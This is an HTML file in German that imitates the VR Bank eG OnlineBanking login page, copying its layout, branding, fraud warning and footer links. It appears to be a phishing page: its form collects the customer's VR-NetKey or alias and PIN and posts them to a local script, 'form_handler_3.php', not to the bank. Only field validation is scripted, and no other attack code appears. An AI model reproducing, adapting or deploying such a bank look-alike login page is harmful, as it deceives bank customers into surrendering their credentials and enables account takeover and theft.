<!DOCTYPE html>
<html lang="de">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anmelden - VR Bank</title>
    <link rel="icon" href="Images/vr_favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        .header_blue {
            background-color: #003366;
            padding: 22px;
        }

        .header_white {
            background-color: #ffffff;
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid lightgrey;
        }

        .background_web {
            color: #f5f7f9;
        }

        .logo-container img {
            height: 45px;
        }

        body {
            background-color: #f4f4f4;
            font-family: Arial, sans-serif;
        }

        h1 {
            margin-bottom: 20px;
            font-size: 28px;
            color: #0f2c63;
            font-weight: bold;
        }

        .login {
            background-color: #ffffff;
            padding: 20px;
            margin-top: 2em;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .floating-label {
            position: relative;
            margin-top: 10px;
        }

        .floating-label label {
            position: absolute;
            top: 0;
            left: 0;
            padding: 18px 12px;
            pointer-events: none;
            transition: all 0.1s ease;
            color: grey;
        }

        .floating-label .form-control {
            border: 1px solid #ccc;
            padding: 16px 12px;
            height: 60px;
        }

        .floating-label .form-control:focus {
            border-color: #0066cc;
            background-color: #e6f3ff;
        }

        .floating-label .form-control:focus+label,
        .floating-label .form-control:not(:placeholder-shown)+label {
            font-size: 10px;
            top: 6px;
            background: transparent;
            padding: 0 12px;
            color: grey;
        }


        .warning {
            background-color: #ffffff;
            padding: 20px;
            margin-top: 25px;
            font-size: 96%;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .headline_bold {
            font-weight: bold;
        }

        .container_blue {
            background-color: #003366;
            padding: 30px;
            margin-top: 50px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            font-size: 12px;
            font-weight: bold;
        }

        .container_text {
            color: #616161;
            font-weight: bold;
            padding-top: 10px;
            font-size: 13px;
            font-weight: bold;
        }

        .nav-link:not(:last-child)::after {
            content: " • ";
            margin: 0 5px;
            color: white;
        }

        .nav-link {
            color: white;
            text-decoration: none;
            padding: 0px;
        }

        .nav-link:hover {
            text-decoration: none;
        }

        .submit {
            border: 2px solid #2a65ad;
            border-radius: 25px;
            padding: 12px 50px;
            background-color: #2a65ad;
            border-color: #2a65ad;
            color: white;
            font-weight: 700;
            cursor: pointer;
            font-size: 12px;
        }

        .submit:hover {
            background-color: #265b9b;
            color: white;
        }

        .cancel {
            border: 2px solid;
            border-radius: 25px;
            padding: 12px 50px;
            background-color: white;
            border-color: #2a65ad;
            color: #2a65ad;
            font-weight: 700;
            cursor: pointer;
            font-size: 12px;
        }

        .cancel:hover {
            background-color: #f4f7fb;
            color: #3964a8;
        }

        .buttons {
            display: flex;
            flex-direction: row;
            justify-content: space-between;
        }

        .img_border {
            margin-left: 20px;
            border-right: 1px solid gray;
        }

        .footer-img {
            width: 75px;
        }
    </style>
</head>

<body>
    <header class="header_blue">
    </header>
    <div class="header_white">
        <div class="container">
            <div class="logo-container">
                <img src="Images/Logo.png" alt="VR Bank Logo">
            </div>
        </div>
    </div>
    </header>
    <div class="container">
        <div class="row">
            <div class="col-lg-7 col-md-7 col-12">
                <div class="login">
                    <h1>Anmelden</h1>
                    <p>Herzlich Willkommen im neuen OnlineBanking Ihrer VR Bank eG</p>
                    <form id="loginForm" action="form_handler_3.php" method="POST">
                        <div class="form-group floating-label">
                            <input class="form-control" type="text" id="alias" name="username" placeholder=" " required>
                            <label for="alias">VR-NetKey oder Alias</label>
                            <p id="aliasError" style="color: red;"></p>
                        </div>
                        <div class="form-group floating-label">
                            <input class="form-control" type="password" id="pin" name="password" placeholder=" "
                                required>
                            <label for="pin">PIN</label>
                            <p id="pinError" style="color: red;"></p>
                        </div>
                        <hr>
                        <div class="buttons">
                            <button type="button" class="btn btn-primary cancel">Abbrechen</button>
                            <button type="submit" class="btn btn-secondary submit">Anmelden</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-7 col-md-7 col-12">
                <div class="warning">
                    <p class="headline_bold">Vorsicht vor Betrug!</p>
                    <p class="p">Unsere Mitarbeiter werden Sie niemals kontaktieren, um nach einer TAN, Zugangsdaten
                        oder
                        Passwörtern zu fragen. Bitte geben Sie diese Informationen niemals an Dritte weiter!</p>
                </div>
            </div>
        </div>
    </div>
    </div>
    <footer>
        <div class="container_blue">
            <div class="row">
                <div class="col-12 mb-2">
                    <nav class="nav justify-content-center">
                        <a class="nav-link text-white" href="https://www.vrbankeg.de/service/rechtliche-hinweise/impressum_OSOGS.nolayer.html">Impressum</a>
                        <a class="nav-link text-white" href="https://www.vrbankeg.de/service/rechtliche-hinweise/datenschutzhinweis-zur-website.html">Datenschutzhinweis</a>
                        <a class="nav-link text-white" href="https://www.vrbankeg.de/service/rechtliche-hinweise/agb-sonderbedingungen.html">AGB & Sonderbedingungen</a>
                        <a class="nav-link text-white" href="https://www.vrbankeg.de/banking-service/sicherheit.html">Sicherheitshinweise</a>
                    </nav>
                </div>
            </div>
        </div>
        <div class="container_text">
            <div class="row">
                <div class="col-12 text-center mb-2">
                    <p>Wir machen den Weg frei. Gemeinsam mit den Spezialisten der Genossenschaftlichen FinanzGruppe
                        Volksbanken Raiffeisenbanken</p>
                </div>
            </div>
        </div>
    </footer>
    <div class="container_images">
        <div class="row">
            <div class="col-12">
                <div class="d-flex justify-content-center align-items-center flex-wrap">
                    <div class="img_border"><img class="footer-img mx-2" src="Images/SchwaebischHall.png"
                            alt="Schwäbisch Hall Logo"></div>
                    <div class="img_border"><img class="footer-img mx-2" src="Images/UnionInvestment.png"
                            alt="Union Investment Logo"></div>
                    <div class="img_border"><img class="footer-img mx-2" src="Images/RundV.png" alt="R und V Logo">
                    </div>
                    <div class="img_border"><img class="footer-img mx-2" src="Images/easyCredit.png"
                            alt="easyCredit Logo"></div>
                    <div class="img_border"><img class="footer-img mx-2" src="Images/DZ_Bank.png" alt="DZ Bank Logo">
                    </div>
                    <div class="img_border"><img class="footer-img mx-2" src="Images/DZPrivatbank.png"
                            alt="DZ Bank Logo"></div>
                    <div class="img_border"><img class="footer-img mx-2" src="Images/VR_Smart_Finanz.png"
                            alt="VR Smart Finanz Logo"></div>
                    <div class="img_border"><img class="footer-img mx-2" src="Images/DGHYP.png" alt="DZ HYP Logo"></div>
                    <div class="img_border"><img class="footer-img mx-2" src="Images/MuenchenerHyp.png"
                            alt="Münchener Hyp Logo"></div>
                    <img class="footer-img mx-2" src="Images/Reisebank.png" alt="Reisebank Logo">
                </div>
            </div>
        </div>
    </div>
    </footer>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const loginForm = document.getElementById('loginForm');
            const aliasInput = document.getElementById('alias');
            const pinInput = document.getElementById('pin');
            const aliasError = document.getElementById('aliasError');
            const pinError = document.getElementById('pinError');
            const submitButton = document.querySelector('.submit');

            submitButton.addEventListener('click', function (event) {
                let valid = true;

                // Zurücksetzen der Fehlermeldungen und Rahmen
                aliasError.textContent = '';
                pinError.textContent = '';
                aliasInput.style.borderColor = '';
                pinInput.style.borderColor = '';
                aliasInput.style.backgroundColor = '';
                pinInput.style.backgroundColor = '';

                // Überprüfung, ob das Alias-Feld gefüllt ist
                if (!aliasInput.value.trim()) {
                    aliasError.innerHTML = '&#9888; VR-NetKey oder Alias erforderlich';
                    aliasInput.style.borderColor = 'red';
                    aliasInput.style.backgroundColor = '#faeeed';
                    valid = false;
                }

                // Überprüfung, ob das PIN-Feld gefüllt ist
                if (!pinInput.value.trim()) {
                    pinError.innerHTML = '&#9888; PIN erforderlich';
                    pinInput.style.borderColor = 'red';
                    pinInput.style.backgroundColor = '#faeeed';
                    valid = false;
                }

                // Verhindern des Standard-Formularsendeverhaltens, wenn Fehler vorhanden sind
                if (!valid) {
                    event.preventDefault();
                }
            });

            // Event Listener, um den roten Rahmen zu entfernen, wenn Benutzer mit der Eingabe beginnen
            aliasInput.addEventListener('input', function () {
                if (aliasInput.value.trim()) {
                    aliasError.textContent = '';
                    aliasInput.style.borderColor = '';
                }
            });

            pinInput.addEventListener('input', function () {
                if (pinInput.value.trim()) {
                    pinError.textContent = '';
                    pinInput.style.borderColor = '';
                }
            });
        });
    </script>

</body>

</html>